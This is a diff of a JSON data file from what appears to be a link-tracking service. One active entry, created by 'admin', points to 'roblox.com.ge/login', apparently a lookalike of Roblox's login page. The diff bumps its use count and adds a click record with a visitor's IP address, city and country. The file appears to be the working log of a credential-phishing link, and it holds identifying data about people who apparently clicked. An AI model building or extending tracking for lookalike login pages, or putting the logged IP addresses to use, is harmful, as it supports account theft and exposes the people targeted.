@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1698,
+    "useCount": 1699,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13752,6 +13752,14 @@
         "city": "Tijuana",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777666463738,
+        "ip": "188.28.248.35",
+        "country": "United Kingdom",
+        "city": "Hounslow",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
